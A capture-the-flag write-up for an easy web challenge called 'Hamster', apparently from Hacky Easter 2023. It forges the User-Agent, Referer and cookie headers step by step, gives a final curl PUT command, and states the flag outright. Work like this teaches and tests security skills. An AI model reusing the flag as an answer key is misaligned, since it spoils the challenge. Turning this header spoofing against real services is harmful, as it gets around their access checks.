Hamster
=============

Difficulty: easy

Tags: web

Description
-------------
The Hamster has a flag for you.

[http://ch.hackyeaster.com:2301](http://ch.hackyeaster.com:2301)

Note: The service is restarted every hour at x:00.


Hint
-------------
curl is your friend.

The ⛳ is not the flag! 😃


Solution
-------------
There are a few steps to getting this one right, and the challenge walks you through them.

| Method | Endpoint | Headers | Response |
|--------|-----|---------|----------|
| GET | `/` | | `Howdy, I am the hamster.Please go to /feed` |
| GET | `/feed` | | `🕴️ only hamster-agent is allowed` |
| GET | `/feed` | `User-Agent: hamster-agent` | `⛳ GET invalid` |
| PUT | `/feed` | `User-Agent: hamster-agent` | `🛑 request must come from hackyhamster.org` |
| PUT | `/feed` | `User-Agent: hamster-agent, Referer: hackyhamster.org` | `🍪 brownie not found` |
| PUT | `/feed` | `User-Agent: hamster-agent, Referer: hackyhamster.org, Cookie: brownie` | `🍪 brownie must be baked` |
| PUT | `/feed` | `User-Agent: hamster-agent, Referer: hackyhamster.org, Cookie: brownie=baked` | `🚩 he2023{s1mpl3_h34d3r_t4mp3r1ng}` |

Final request:
```
curl --location --request PUT 'http://ch.hackyeaster.com:2301/feed' \
--header 'User-Agent: hamster-agent' \
--header 'Referer: hackyhamster.org' \
--header 'Cookie: brownie=baked;'
```

Flag
-------------
`he2023{s1mpl3_h34d3r_t4mp3r1ng}`